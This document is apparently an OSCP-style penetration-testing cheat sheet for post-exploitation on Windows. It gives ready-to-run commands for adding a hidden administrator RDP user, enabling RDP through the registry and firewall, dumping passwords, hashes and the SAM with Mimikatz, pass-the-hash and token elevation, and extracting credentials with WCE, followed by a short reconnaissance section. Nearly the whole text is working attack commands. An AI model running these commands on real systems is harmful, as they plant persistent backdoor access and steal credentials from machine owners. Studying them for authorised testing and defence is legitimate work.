# Windows

## Add RDP user

```
net user hodor Qwerty123! /add
net localgroup administrators hodor /add
net localgroup "Remote Desktop Users" hodor /add
```

## Enable RDP

Via registry:

```text
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
```

Add firewall rule:

```text
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```

## Rdesktop resolution

```text
rdesktop -g 1024x768 x.x.x.x
```

## Passwords and hashes

### Mimikatz

Extract passwords, keys, pin codes, tickets from "lsass" memory:

```text
privilege::debug
log sekurlsa.log
sekurlsa::logonpasswords
```

Pass-the-hash

```text
privilege::debug
log sekurlsa.log
sekurlsa::sekurlsa::pth /user:Administrator /domain:acme /ntlm:893efccda23744616cf7accab23ascbb /run:cmd
```

Elevate token

```text
privilege::debug
log sekurlsa.log
token::elevate
```

Dump SAM

```text
privilege::debug
log sekurlsa.log
lsadump::sam
```

## Windows Credential Editor \(WCE\)

Security tool that can be used to extract cleartext passwords and NTLM hashes from a Windows host. Administrator privileges are required.

{% embed url="https://www.ampliasecurity.com/research/windows-credentials-editor/" %}

```text
C:\> wce -w
```

## Networking

Is there a connection with another host?

```text
netstat -ano
```

Hosts file

```text
C:\WINDOWS\System32\drivers\etc\hosts
```

Firewall config

```text
netsh firewall show state
netsh firewall show config
netsh dump
```

## **References**

* \*\*\*\*[**https://oscp.securable.nl/**](https://oscp.securable.nl/)\*\*\*\*

